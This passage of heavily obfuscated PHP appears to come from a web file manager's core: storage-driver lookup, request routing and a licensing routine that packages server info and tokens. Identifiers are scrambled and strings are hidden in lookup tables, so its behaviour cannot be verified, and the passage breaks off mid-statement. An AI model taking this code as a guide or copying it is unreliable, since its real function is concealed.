$øãòŸ×[$ÏøÉÖñ¶[1092]] = trim($¥²Ì¸®Å, $ÏøÉÖñ¶[8]); } unset($øãòŸ×); return array_to_keyvalue($â§î¢é, $ÏøÉÖñ¶[1092]); } public static function fileSubstr($çÅßèÇÏ, $ÉáêÀí, $‹é¶£´ = false) { $óÎëó–° =& $_SERVER[ÏÒ Ì„]; $ìÌÏØÚ¹ = self::driverMake($çÅßèÇÏ); $¡ ×Àåä = $ìÌÏØÚ¹->size($çÅßèÇÏ); $§·¿”°˜ = $ÉáêÀí; $ÃĞù•¦˜ = $‹é¶£´; if ($ÉáêÀí < 0) { $ÉáêÀí = $¡ ×Àåä + $ÉáêÀí; } if ($‹é¶£´ === !1) { $‹é¶£´ = $¡ ×Àåä - $ÉáêÀí; } if ($ÉáêÀí + $‹é¶£´ > $¡ ×Àåä) { $‹é¶£´ = $¡ ×Àåä - $ÉáêÀí; } if (!$¡ ×Àåä && $ìÌÏØÚ¹->getType() == $óÎëó–°[106] && !$ìÌÏØÚ¹->exist($çÅßèÇÏ)) { throw new Exception($óÎëó–°[1093] . LNG($óÎëó–°[1094]) . $óÎëó–°[961] . get_path_this($çÅßèÇÏ) . $óÎëó–°[33]); } if ($‹é¶£´ <= 0) { return $óÎëó–°[33]; } if ($ÉáêÀí < 0 || $ÉáêÀí >= $¡ ×Àåä || $‹é¶£´ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\122\x65\141\x64\40\145\162\x72\x6f\x72\41\x20\x73\164\141\x72\x74\75{$ÉáêÀí}\73\x6c\x65\x6e\x67\164\150\x3d{$‹é¶£´}\x3b\40\x73\x69\172\145\x3d{$¡ ×Àåä}\x3b"); } $Ö´ï†é = $ìÌÏØÚ¹->fileSubstr($çÅßèÇÏ, $ÉáêÀí, $‹é¶£´); if (!$Ö´ï†é && $‹é¶£´ && isset($GLOBALS[$óÎëó–°[1095]])) { throw new Exception($GLOBALS[$óÎëó–°[1095]][$óÎëó–°[1096]]); } return $Ö´ï†é; } private static function driverMake(&$Ë½¿±†Ò) { $½â¼‚Ò¿ =& $_SERVER[ÏÒ Ì„]; $ıéî€ê = KodIO::parse($Ë½¿±†Ò); if (!self::$driverListSystem) { $úó›— · = Model($½â¼‚Ò¿[757])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($úó›— ·, $½â¼‚Ò¿[395]); } if ($ıéî€ê[$½â¼‚Ò¿[29]] == KodIO::KOD_IO && !self::$driverListSystem[$ıéî€ê[$½â¼‚Ò¿[395]]]) { return !1; } $Ë½¿±†Ò = $ıéî€ê[$½â¼‚Ò¿[1097]]; $ùµ—Œ—ı = self::driverGet($ıéî€ê, $Ë½¿±†Ò); return $ùµ—Œ—ı; } private static function driverGet($Í×Üç­Â, &$¸•Åã½×) { $ˆ¼×¹¥È =& $_SERVER[ÏÒ Ì„]; $üë‚Õó = $Í×Üç­Â[$ˆ¼×¹¥È[1098]]; $ˆñ“şÅ = $Í×Üç­Â[$ˆ¼×¹¥È[395]]; switch ($Í×Üç­Â[$ˆ¼×¹¥È[29]]) { case KodIO::KOD_IO: $Ö˜êºòë = self::$driverListSystem[$ˆñ“şÅ]; break; case KodIO::KOD_SOURCE: $¸•Åã½× = $ˆñ“şÅ . $¸•Åã½×; $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1100], $ˆ¼×¹¥È[6] => $Í×Üç­Â); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ŒúØ›Ö¸ = $GLOBALS[$ˆ¼×¹¥È[1101]]; self::$driverListUser = array_to_keyvalue($ŒúØ›Ö¸, $ˆ¼×¹¥È[395]); } $Ö˜êºòë = self::$driverListUser[$ˆñ“şÅ]; break; case KodIO::KOD_SHARE_LINK: $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1102], $ˆ¼×¹¥È[6] => $Í×Üç­Â); $Ù¥Âà¯ = Action($ˆ¼×¹¥È[1103])->sharePathInfo($Í×Üç­Â[$ˆ¼×¹¥È[76]]); $¸•Åã½× = $Ù¥Âà¯[$ˆ¼×¹¥È[397]]; if (!$Ù¥Âà¯[$ˆ¼×¹¥È[397]]) { $»ÓÊğÓª = Model($ˆ¼×¹¥È[589])->getInfo($Ù¥Âà¯[$ˆ¼×¹¥È[482]]); $¸•Åã½× = KodIO::clear($»ÓÊğÓª[$ˆ¼×¹¥È[1104]] . $Í×Üç­Â[$ˆ¼×¹¥È[1097]]); $Í×Üç­Â[$ˆ¼×¹¥È[480]] = $»ÓÊğÓª; $Í×Üç­Â[$ˆ¼×¹¥È[1081]] = $¸•Åã½×; $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1105], $ˆ¼×¹¥È[6] => $Í×Üç­Â); } break; case KodIO::KOD_SHARE_ITEM: $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1106], $ˆ¼×¹¥È[6] => $Í×Üç­Â); $»ÓÊğÓª = Model($ˆ¼×¹¥È[589])->getInfo($Í×Üç­Â[$ˆ¼×¹¥È[395]]); if ($»ÓÊğÓª[$ˆ¼×¹¥È[397]] == $ˆ¼×¹¥È[191]) { $¸•Åã½× = KodIO::clear($»ÓÊğÓª[$ˆ¼×¹¥È[1104]] . $Í×Üç­Â[$ˆ¼×¹¥È[1097]]); $Í×Üç­Â[$ˆ¼×¹¥È[480]] = $»ÓÊğÓª; $Í×Üç­Â[$ˆ¼×¹¥È[1081]] = $¸•Åã½×; $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1107], $ˆ¼×¹¥È[6] => $Í×Üç­Â); } else { if (!$¸•Åã½×) { $¸•Åã½× = $»ÓÊğÓª[$ˆ¼×¹¥È[397]]; } } break; default: $¸•Åã½× = $Í×Üç­Â[$ˆ¼×¹¥È[76]]; $Ö˜êºòë = array($ˆ¼×¹¥È[1099] => $ˆ¼×¹¥È[1108]); break; } $†™ÎØş¶ = $Í×Üç­Â[$ˆ¼×¹¥È[76]]; if (!isset(self::$driverCache[$†™ÎØş¶])) { $ÅÎ¹ä€æ = strtolower($Ö˜êºòë[$ˆ¼×¹¥È[94]]); $ù‚•ƒºé = $GLOBALS[$ˆ¼×¹¥È[6]][$ˆ¼×¹¥È[88]][$ˆ¼×¹¥È[823]]; $¼òäªš = $ˆ¼×¹¥È[72] . (isset($ù‚•ƒºé[$ÅÎ¹ä€æ]) ? $ù‚•ƒºé[$ÅÎ¹ä€æ] : ucfirst($ÅÎ¹ä€æ)); if (!class_exists($¼òäªš)) { show_json("{$¼òäªš}\x20\x6e\157\164\40\x65\170\151\x73\x74\163\41", !1); } $ İñªğ¤ = isset($Ö˜êºòë[$ˆ¼×¹¥È[6]]) ? $Ö˜êºòë[$ˆ¼×¹¥È[6]] : !1; self::$driverCache[$†™ÎØş¶] = new $¼òäªš($ İñªğ¤); } $ÀÄñ¼è† = self::$driverCache[$†™ÎØş¶]; $ÀÄñ¼è†->pathDriver = $üë‚Õó; $ÀÄñ¼è†->pathBase = $ˆ¼×¹¥È[33]; if (isset($Ö˜êºòë[$ˆ¼×¹¥È[6]][$ˆ¼×¹¥È[1109]])) { $ÀÄñ¼è†->pathBase = rtrim($Ö˜êºòë[$ˆ¼×¹¥È[6]][$ˆ¼×¹¥È[1109]], $ˆ¼×¹¥È[8]) . $ˆ¼×¹¥È[8]; $¸•Åã½× = $ÀÄñ¼è†->pathBase . ltrim($¸•Åã½×, $ˆ¼×¹¥È[8]); } $¸•Åã½× = $ÀÄñ¼è†->getPath($¸•Åã½×); if (isset($Í×Üç­Â[$ˆ¼×¹¥È[1081]])) { $¸•Åã½× = $Í×Üç­Â[$ˆ¼×¹¥È[1081]]; } $ÀÄñ¼è†->path = $¸•Åã½×; return $ÀÄñ¼è†; } public static function errorTips($¸àû¦† = false) { $Äˆ¢é×„ =& $_SERVER[ÏÒ Ì„]; static $‡ÛÊ¨›ã = array(); $æÊ‚¨Ó = 1000; if ($¸àû¦† === -1) { return $‡ÛÊ¨›ã ? $‡ÛÊ¨›ã[count($‡ÛÊ¨›ã) - 1] : $Äˆ¢é×„[33]; } if ($¸àû¦† === !1) { return implode($Äˆ¢é×„[229], $‡ÛÊ¨›ã); } if (count($‡ÛÊ¨›ã) >= $æÊ‚¨Ó) { $‡ÛÊ¨›ã = array_slice($‡ÛÊ¨›ã, $æÊ‚¨Ó * 0.5, $æÊ‚¨Ó); } $‡ÛÊ¨›ã[] = $¸àû¦†; write_log($Äˆ¢é×„[160] . ACTION . $Äˆ¢é×„[1110] . $¸àû¦†, $Äˆ¢é×„[1111]); } public static function getLastError($ÛÁ‘¤©Ú = '') { $×§­” = self::errorTips(-1); return $×§­” ? $×§­” : $ÛÁ‘¤©Ú; } } goto E Ş¸ö¼³Â; A«Û£»“©à: class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\151\x6e\x64\x65\170"; function __construct() { } public function setDefault($À ¾Å†ş) { $› ¼Û…¯ =& $_SERVER[ÏÒ Ì„]; $ôÙÉÅúÑ =& $_SERVER[º‚ØÇıÁ]; $¶ƒêÇ¥× = explode($ôÙÉÅúÑ[0], trim($À ¾Å†ş, $ôÙÉÅúÑ[0])); $Î»ò×¤Ÿ = $› ¼Û…¯[604]; if (strlen($Î»ò×¤Ÿ) < $› ¼Û…¯[605]) { return; } $this->defaultModule = $¶ƒêÇ¥×[0] ? $¶ƒêÇ¥×[0] : $this->defaultModule; $µ°ğÃ·ö = $› ¼Û…¯[606]; if (strlen($µ°ğÃ·ö) < $› ¼Û…¯[605]) { die; } $this->defaultController = $¶ƒêÇ¥×[1] ? $¶ƒêÇ¥×[1] : $this->defaultController; $this->defaultAction = $¶ƒêÇ¥×[2] ? $¶ƒêÇ¥×[2] : $this->defaultAction; $this->ohlz930479af($ôÙÉÅúÑ[1], array($this, $ôÙÉÅúÑ[2])); $­›†Û› = $› ¼Û…¯[607]; while ($­›†Û› < $› ¼Û…¯[608]) { if ($­›†Û› >= 0) { break; } $­›†Û›++; } } public function appRun($î­•£§×) { $…íóÍÔŒ =& $_SERVER[º‚ØÇıÁ]; $ışŠË¨€ = explode($…íóÍÔŒ[0], $î­•£§×); $·Õä¯áç = strtolower($ışŠË¨€[0]); $¶ úÂä = $…íóÍÔŒ[3]; if ($·Õä¯áç == $…íóÍÔŒ[4]) { $¶ úÂä = $…íóÍÔŒ[5]; $ışŠË¨€[0] = $…íóÍÔŒ[6]; $ışŠË¨€[1] = $ışŠË¨€[1] . $…íóÍÔŒ[7]; $î­•£§× = join($…íóÍÔŒ[0], $ışŠË¨€); $î­•£§× = trim($î­•£§×, $…íóÍÔŒ[0]); } call_user_func(array($…íóÍÔŒ[8], $…íóÍÔŒ[9]), $¶ úÂä . $…íóÍÔŒ[10], $î­•£§×); ActionCall($î­•£§×); $Ë©ñ´¥ = $_SERVER[ÏÒ Ì„][609]; if (!$Ë©ñ´¥) { return; } call_user_func(array($…íóÍÔŒ[8], $…íóÍÔŒ[9]), $¶ úÂä . $…íóÍÔŒ[11], $î­•£§×); } private function autorun() { $¯ùºäÁ‹ =& $_SERVER[ÏÒ Ì„]; $¨¥é÷ù =& $_SERVER[º‚ØÇıÁ]; global $config; $é”Ÿ¢ò¶ = $¯ùºäÁ‹[610]; if (count($config[$¨¥é÷ù[12]]) == 0) { return; } foreach ($config[$¨¥é÷ù[12]] as $Şöíèòø => $Öˆ‰“) { $this->appRun($Öˆ‰“); $£‘â–é = $¯ùºäÁ‹[611]; } } private function sixl75a39a16() { $Ê¡‡…®Ş =& $_SERVER[º‚ØÇıÁ]; $»ƒÑ‡Ó = $Ê¡‡…®Ş[4]; $ÕÍ¼Ò‹ = $GLOBALS[$Ê¡‡…®Ş[13]][$Ê¡‡…®Ş[14]][0]; if (!$ÕÍ¼Ò‹ || strlen($ÕÍ¼Ò‹) <= strlen($»ƒÑ‡Ó)) { return; } if (strtolower(substr($ÕÍ¼Ò‹, -strlen($»ƒÑ‡Ó))) != $»ƒÑ‡Ó) { return; } $ßÆÈñã = substr($ÕÍ¼Ò‹, 0, -strlen($»ƒÑ‡Ó)); $˜ß×ò±Ü = array($Ê¡‡…®Ş[4], $ßÆÈñã); $ŠÜ™¡€ı = array_slice($GLOBALS[$Ê¡‡…®Ş[13]][$Ê¡‡…®Ş[14]], 1); $Õº’»è = $_SERVER[ÏÒ Ì„][612]; $GLOBALS[$Ê¡‡…®Ş[13]][$Ê¡‡…®Ş[14]] = array_merge($˜ß×ò±Ü, $ŠÜ™¡€ı); $GLOBALS[$Ê¡‡…®Ş[13]][$Ê¡‡…®Ş[15]] = implode($Ê¡‡…®Ş[0], $GLOBALS[$Ê¡‡…®Ş[13]][$Ê¡‡…®Ş[14]]); } private function vokqe032690c() { $ä¥Œ„è„ =& $_SERVER[ÏÒ Ì„]; $¹ïä©ÛÊ =& $_SERVER[º‚ØÇıÁ]; if ($GLOBALS[$¹ïä©ÛÊ[13]][$¹ïä©ÛÊ[15]] != $¹ïä©ÛÊ[6]) { return; } $Áª¥Úš¹ = $_SERVER[$¹ïä©ÛÊ[16]]; $œÈì÷É = $¹ïä©ÛÊ[17]; if (!strstr($Áª¥Úš¹, $œÈì÷É)) { return; } $Ëµåé‚ = strrpos($Áª¥Úš¹, $œÈì÷É); $”ĞÁÙ®÷ = substr($Áª¥Úš¹, $Ëµåé‚ + strlen($œÈì÷É)); preg_match_all($¹ïä©ÛÊ[18], $”ĞÁÙ®÷, $ÀÉø©©); $”ĞÁÙ®÷ = trim($ÀÉø©©[0][0], $¹ïä©ÛÊ[19]); $«¯£³õœ = $ä¥Œ„è„[613]; if (strlen($«¯£³õœ) < $ä¥Œ„è„[605]) { die; } $GLOBALS[$¹ïä©ÛÊ[13]][$¹ïä©ÛÊ[14]] = explode($¹ïä©ÛÊ[19], $”ĞÁÙ®÷); $GLOBALS[$¹ïä©ÛÊ[13]][$¹ïä©ÛÊ[15]] = implode($¹ïä©ÛÊ[0], $GLOBALS[$¹ïä©ÛÊ[13]][$¹ïä©ÛÊ[14]]); $Ç¢§½Áü = $ä¥Œ„è„[614]; } public function run() { $Ø‚áµõ =& $_SERVER[ÏÒ Ì„]; $­ÆÈÒà¢ =& $_SERVER[º‚ØÇıÁ]; $this->vokqe032690c(); $this->sixl75a39a16(); $¸¸Ğòñ = $Ø‚áµõ[615]; if (!$¸¸Ğòñ) { return; } $ËÄÔğ÷¼ = $GLOBALS[$­ÆÈÒà¢[13]][$­ÆÈÒà¢[14]]; $ãÍ¤òˆ× = $GLOBALS[$­ÆÈÒà¢[13]][$­ÆÈÒà¢[15]]; define($­ÆÈÒà¢[20], isset($ËÄÔğ÷¼[0]) && $ËÄÔğ÷¼[0] ? $ËÄÔğ÷¼[0] : $this->defaultModule); define($­ÆÈÒà¢[21], isset($ËÄÔğ÷¼[1]) && $ËÄÔğ÷¼[0] ? $ËÄÔğ÷¼[1] : $this->defaultController); $ıüŸÊğ = $Ø‚áµõ[616]; define($­ÆÈÒà¢[22], isset($ËÄÔğ÷¼[2]) && $ËÄÔğ÷¼[0] ? $ËÄÔğ÷¼[2] : $this->defaultAction); $‚Êå¾Õ¢ = $Ø‚áµõ[617]; define($­ÆÈÒà¢[23], MOD . $­ÆÈÒà¢[0] . ST . $­ÆÈÒà¢[0] . ACT); $–º¿úî = $Ø‚áµõ[618]; if (!$–º¿úî) { return; } $_SERVER[$­ÆÈÒà¢[24]] = strtolower(ACTION); $this->autorun(); if (count($ËÄÔğ÷¼) >= 3) { $this->appRun($ãÍ¤òˆ×); } else { $this->appRun(ACTION); } } private $snxt3d78b5a7 = array(); private $nyla60778d65 = ''; public function bztma68ad8a4() { $ùà¡õ¹Â =& $_SERVER[ÏÒ Ì„]; $âØÕãèñ =& $_SERVER[º‚ØÇıÁ]; $this->vgwu5c9adfcc(); $«‹åóşÆ = $ùà¡õ¹Â[619]; while ($«‹åóşÆ < $ùà¡õ¹Â[608]) { if ($«‹åóşÆ >= 0) { break; } $«‹åóşÆ++; } $this->cyqf81030e71(); $this->hpln47ac0fc0(); $this->ufdya962dbd9(); $©†„°ƒË = $ùà¡õ¹Â[620]; $this->dgvo743f3a80(); $this->zwch6f768741(); $•Ş„°åé = $ùà¡õ¹Â[621]; $this->smnz865f7cab(); $¸ÒëúÔ = $ùà¡õ¹Â[622]; while ($¸ÒëúÔ < $ùà¡õ¹Â[605]) { if ($¸ÒëúÔ >= 0) { break; } $¸ÒëúÔ++; } $this->ohlz930479af($âØÕãèñ[25], array($this, $âØÕãèñ[26])); $this->ohlz930479af($âØÕãèñ[27], array($this, $âØÕãèñ[28])); $è€ª = $ùà¡õ¹Â[623]; if (strlen($è€ª) < $ùà¡õ¹Â[605]) { return; } $this->ohlz930479af($âØÕãèñ[29], array($this, $âØÕãèñ[30])); $ËŞè± = $ùà¡õ¹Â[624]; if (strlen($ËŞè±) < $ùà¡õ¹Â[608]) { die; } $this->ohlz930479af($âØÕãèñ[31], array($this, $âØÕãèñ[32])); } public function zwng4180e24b($’·Áò‡Æ) { $£ ˜óŠÍ =& $_SERVER[ÏÒ Ì„]; $İ«ÑØùï =& $_SERVER[º‚ØÇıÁ]; $²õĞ¦® = Model($İ«ÑØùï[33])->get(); $¿šƒãî = $£ ˜óŠÍ[625]; while (strlen($¿šƒãî) < $£ ˜óŠÍ[626]) { if (!$¿šƒãî) { break; } $¿šƒãî++; } $ù‡×ÊøÑ = array($İ«ÑØùï[34], $İ«ÑØùï[35], $İ«ÑØùï[36], $İ«ÑØùï[37], $İ«ÑØùï[38], $İ«ÑØùï[39], $İ«ÑØùï[40], $İ«ÑØùï[41], $İ«ÑØùï[42], $İ«ÑØùï[43], $İ«ÑØùï[44], $İ«ÑØùï[45], $İ«ÑØùï[46], $İ«ÑØùï[47], $İ«ÑØùï[48], $İ«ÑØùï[49], $İ«ÑØùï[50], $İ«ÑØùï[51], $İ«ÑØùï[52], $İ«ÑØùï[53], $İ«ÑØùï[54], $İ«ÑØùï[55], $İ«ÑØùï[56], $İ«ÑØùï[57], $İ«ÑØùï[58], $İ«ÑØùï[59], $İ«ÑØùï[60], $İ«ÑØùï[61], $İ«ÑØùï[62], $İ«ÑØùï[63], $İ«ÑØùï[64], $İ«ÑØùï[65], $İ«ÑØùï[66], $İ«ÑØùï[67], $İ«ÑØùï[68], $İ«ÑØùï[69], $İ«ÑØùï[70], $İ«ÑØùï[71], $İ«ÑØùï[72], $İ«ÑØùï[73], $İ«ÑØùï[74], $İ«ÑØùï[75], $İ«ÑØùï[76], $İ«ÑØùï[77], $İ«ÑØùï[78], $İ«ÑØùï[79], $İ«ÑØùï[80]); $ûúİê½Ç = $£ ˜óŠÍ[627]; if (strlen($ûúİê½Ç) < $£ ˜óŠÍ[628]) { die; } foreach ($ù‡×ÊøÑ as $œ­Ê±›¾) { $Şî½±ÓÃ = $GLOBALS[$İ«ÑØùï[81]][$İ«ÑØùï[82]][$œ­Ê±›¾]; $åÄšşà = $£ ˜óŠÍ[629]; if (strlen($åÄšşà) < $£ ˜óŠÍ[605]) { die; } if (isset($²õĞ¦®[$œ­Ê±›¾])) { $Şî½±ÓÃ = $²õĞ¦®[$œ­Ê±›¾]; } $’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$œ­Ê±›¾] = $Şî½±ÓÃ; } $í®óªç = $’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$İ«ÑØùï[46]]; $·Ñ²÷ÁÁ = $£ ˜óŠÍ[630]; unset($’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[85]][$İ«ÑØùï[86]]); $÷¼ú›¨ = $£ ˜óŠÍ[631]; if (!$÷¼ú›¨) { return; } unset($’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[85]][$İ«ÑØùï[87]]); $÷¨Æï’¦ = $£ ˜óŠÍ[632]; if (strlen($÷¨Æï’¦) < $£ ˜óŠÍ[605]) { die; } unset($’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$İ«ÑØùï[46]]); unset($’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$İ«ÑØùï[88]]); $ƒÓ»—ê¾ = $£ ˜óŠÍ[633]; $’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$İ«ÑØùï[89]] = array($İ«ÑØùï[90] => (int) $í®óªç[$İ«ÑØùï[91]], $İ«ÑØùï[92] => (int) _get($í®óªç, $İ«ÑØùï[93], 0)); $”û”ß¨… = $£ ˜óŠÍ[634]; if (!$”û”ß¨…) { die; } $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[95]] = Action($İ«ÑØùï[96])->accessToken(); $¨¡êÁØ‡ = $£ ˜óŠÍ[635]; while (strlen($¨¡êÁØ‡) < $£ ˜óŠÍ[628]) { if (!$¨¡êÁØ‡) { break; } $¨¡êÁØ‡++; } $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[97]] = md5($_SERVER[$İ«ÑØùï[98]] . $²õĞ¦®[$İ«ÑØùï[99]]); $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[100]] = base64_encode(serverInfo()); $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[101]] = $this->nyla60778d65; $ÄôÃ§²â = $£ ˜óŠÍ[636]; if ($²õĞ¦®[$İ«ÑØùï[101]] != $İ«ÑØùï[102]) { $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[103]] = $²õĞ¦®[$İ«ÑØùï[103]]; $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[104]] = $²õĞ¦®[$İ«ÑØùï[104]]; $Ôßä¹ = rand_string(10) . $this->nyla60778d65 . rand_string(5); $’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[105]][$İ«ÑØùï[106]] = $this->gfiu2dd249b4($Ôßä¹, $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[97]]); } if ($this->nyla60778d65 == $İ«ÑØùï[102]) { $’·Áò‡Æ[$İ«ÑØùï[83]][$İ«ÑØùï[84]][$İ«ÑØùï[89]][$İ«ÑØùï[93]] = 0; } $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[107]] = _get($this->snxt3d78b5a7, $İ«ÑØùï[108], $İ«ÑØùï[6]); $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[109]] = _get($this->snxt3d78b5a7, $İ«ÑØùï[110], $İ«ÑØùï[6]); $“Âñœ½ = $£ ˜óŠÍ[637]; while ($“Âñœ½ < $£ ˜óŠÍ[608]) { if ($“Âñœ½ >= 0) { break; } $“Âñœ½++; } if (_get($GLOBALS, $İ«ÑØùï[111]) && $this->config[$İ«ÑØùï[112]]) { $’·Áò‡Æ[$İ«ÑØùï[94]][$İ«ÑØùï[113]] = WEB_ROOT; } return $’·Áò‡Æ; } private function zwch6f768741() { $ûâëù Ü =& $_SERVER[ÏÒ Ì„]; $êéù¦…¤ =& $_SERVER[º‚ØÇıÁ]; if ($_SERVER[$êéù¦…¤[24]] == $êéù¦…¤[114]) { $ğ¸‡Ôäé = array($êéù¦…¤[101] => $this->nyla60778d65, $êéù¦…¤[115] => $this->eubfbc5c8674(), $êéù¦…¤[116] => Model($êéù¦…¤[117])->count()); if ($this->nyla60778d65 != $êéù¦…¤[102]) { $¿ ö“´º = _get($this->snxt3d78b5a7, $êéù¦…¤[118]); if ($¿ ö“´º) { $ğ¸‡Ôäé[$êéù¦…¤[119]] = $¿ ö“´º; $ğ¸‡Ôäé[$êéù¦…¤[120]] = strtotime(_get($this->snxt3d78b5a7, $êéù¦…¤[121])); $ğ¸‡Ôäé[$êéù¦…¤[122]] = _get($this->snxt3d78b5a7, $êéù¦…¤[110]); } $Õé®øêÅ = Model($êéù¦…¤[33])->get($êéù¦…¤[123], $êéù¦…¤[6], !0); if (is_string($Õé®øêÅ) && substr($Õé®øêÅ, 0, 1) == $êéù¦…¤[124]) { $Õé®øêÅ = json_decode_force($Õé®øêÅ); } if (is_array($Õé®øêÅ) && $Õé®øêÅ[$êéù¦…¤[125]] && strstr($Õé®øêÅ[$êéù¦…¤[125]], $êéù¦…¤[126])) { $Ğ‚Á·×Ê = explode($êéù¦…¤[126], $Õé®øêÅ[$êéù¦…¤[125]]); $ğ¸‡Ôäé[$êéù¦…¤[127]] = $Ğ‚Á·×Ê[0]; } } $ğ¸‡Ôäé = $this->xqyodcd9fac2(json_encode($ğ¸‡Ôäé), md5($êéù¦…¤[128])); $˜Ö¾îÙ– = $ûâëù Ü[638]; if (!$˜Ö¾îÙ–) { return; } $ÄæÅ¹Ä« = array($êéù¦…¤[129] => $ğ¸‡Ôäé); call_user_func(array($êéù¦…¤[130], $êéù¦…¤[131]), $ÄæÅ¹Ä«); $¼¸¿—ß„ = $ûâëù Ü[639]; if (strlen($¼¸¿—ß„) < $ûâëù Ü[626]) { return; } } if ($this->nyla60778d65 == $êéù¦…¤[102]) { return; } $Éíàú‹ı = array($êéù¦…¤[132], $êéù¦…¤[133], $êéù¦…¤[134], $êéù¦…¤[135], $êéù¦…¤[136], $êéù¦…¤[137]); $‡ô¾É ¦ = Model($êéù¦…¤[33])->get(); $û ø¯ëß = $ûâëù Ü[640]; $ÄæÅ¹Ä« = array($êéù¦…¤[138] => $‡ô¾É ¦[$êéù¦…¤[34]], $êéù¦…¤[139] => $‡ô¾É ¦[$êéù¦…¤[35]], $êéù¦…¤[140] => $êéù¦…¤[6]); $Åáêğ¬´ = $ûâëù Ü[641]; while ($Åáêğ¬´ < $ûâëù Ü[605]) { if ($Åáêğ¬´ >= 0) { break; } $Åáêğ¬´++; } foreach ($Éíàú‹ı as $ù½èó€Æ) { if (!isset($‡ô¾É ¦[$ù½èó€Æ]) || !$‡ô¾É ¦[$ù½èó€Æ]) { continue; } $ÄæÅ¹Ä«[$ù½èó€Æ] = $‡ô¾É ¦[$ù½èó€Æ]; } call_user_func(array($êéù¦…¤[130], $êéù¦…¤[131]), $ÄæÅ¹Ä«); } private function ufdya962dbd9() { $áÅÅ•µ¦ =& $_SERVER[ÏÒ Ì„]; $Àœ¯Â«¼ =& $_SERVER[º‚ØÇıÁ]; if ($_SERVER[$Àœ¯Â«¼[24]] != $Àœ¯Â«¼[141]) { return; } if (!_get($GLOBALS, $Àœ¯Â«¼[111])) { die; } $±îŠ‰ = $GLOBALS[$Àœ¯Â«¼[13]]; if (isset($±îŠ‰[$Àœ¯Â«¼[142]])) { $this->ebxh8effa31d(); die; } if (!isset($±îŠ‰[$Àœ¯Â«¼[143]]) || strlen($±îŠ‰[$Àœ¯Â«¼[143]]) != 16) { show_json($Àœ¯Â«¼[144] . $±îŠ‰[$Àœ¯Â«¼[143]], !1); } $òÈş¶µ = Model($Àœ¯Â«¼[33])->get($Àœ¯Â«¼[99]); $Üäû›Öı = md5($_SERVER[$Àœ¯Â«¼[98]] . $òÈş¶µ); $«Ô‚×®å = array($Àœ¯Â«¼[143] => $±îŠ‰[$Àœ¯Â«¼[143]], $Àœ¯Â«¼[145] => rand_string(16), $Àœ¯Â«¼[146] => $Àœ¯Â«¼[128], $Àœ¯Â«¼[147] => $Àœ¯Â«¼[148], $Àœ¯Â«¼[149] => $_SERVER[$Àœ¯Â«¼[150]], $Àœ¯Â«¼[151] => $_SERVER[$Àœ¯Â«¼[152]], $Àœ¯Â«¼[153] => $_SERVER[$Àœ¯Â«¼[154]], $Àœ¯Â«¼[97] => $Üäû›Öı, $Àœ¯Â«¼[155] => Model($Àœ¯Â«¼[33])->get($Àœ¯Â«¼[123])); $™¤ª„œš = $áÅÅ•µ¦[642]; if (strlen($™¤ª„œš) < $áÅÅ•µ¦[605]) { return; } if ($±îŠ‰[$Àœ¯Â«¼[156]] == $Àœ¯Â«¼[157]) { $‚Ïì³¸Â = $this->xqyodcd9fac2($Üäû›Öı, $Àœ¯Â«¼[158]); $²Ò²·ú = $this->gfiu2dd249b4(json_encode($«Ô‚×®å), $Üäû›Öı . $Àœ¯Â«¼[159], 3); $²Ò²·ú = $²Ò²·ú . $Àœ¯Â«¼[160] . $_SERVER[$Àœ¯Â«¼[150]]; $éÎëÆ¸½ = $this->btrs7f16bf75($Àœ¯Â«¼[161] . $‚Ïì³¸Â . $Àœ¯Â«¼[162] . $²Ò²·ú, -1); show_json($éÎëÆ¸½, !0); } else { if ($±îŠ‰[$Àœ¯Â«¼[156]] == $Àœ¯Â«¼[163]) { $¥Œ§‚À„ = substr(md5($Àœ¯Â«¼[164] . $Üäû›Öı), 12, 15) . $Àœ¯Â«¼[165]; $²Ò²·ú = $this->lfnw320a3134(trim($±îŠ‰[$Àœ¯Â«¼[166]]), $¥Œ§‚À„, 2); $Úıı¨Ñ = json_decode($²Ò²·ú, !0); if (!is_array($Úıı¨Ñ) || !is_array($Úıı¨Ñ[$Àœ¯Â«¼[167]]) || $Úıı¨Ñ[$Àœ¯Â«¼[143]] != !0) { $ã¢¨„üæ = $Àœ¯Â«¼[168]; $¯´ìÁêå = $Úıı¨Ñ[$Àœ¯Â«¼[167]] ? $Àœ¯Â«¼[169] . $Úıı¨Ñ[$Àœ¯Â«¼[167]] : $ã¢¨„üæ; show_json($¯´ìÁêå, !1); } else { $«Ô‚×®å[$Àœ¯Â«¼[145]] = $Úıı¨Ñ[$Àœ¯Â«¼[167]][$Àœ¯Â«¼[170]]; } } else { $Úıı¨Ñ = $this->btrs7f16bf75($Àœ¯Â«¼[171], $«Ô‚×®å, 10); } } if (!is_array($Úıı¨Ñ) || 